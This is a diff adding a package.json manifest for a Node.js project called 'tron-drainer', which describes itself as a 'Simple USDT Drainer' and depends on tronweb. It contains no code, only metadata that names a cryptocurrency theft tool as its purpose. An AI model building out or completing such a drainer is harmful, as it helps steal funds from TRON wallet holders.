@@ -1,0 +1,12 @@
+{
+  "name": "tron-drainer",
+  "version": "1.0.0",
+  "description": "Simple USDT Drainer",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "tronweb": "^5.3.0"
+  }
+}
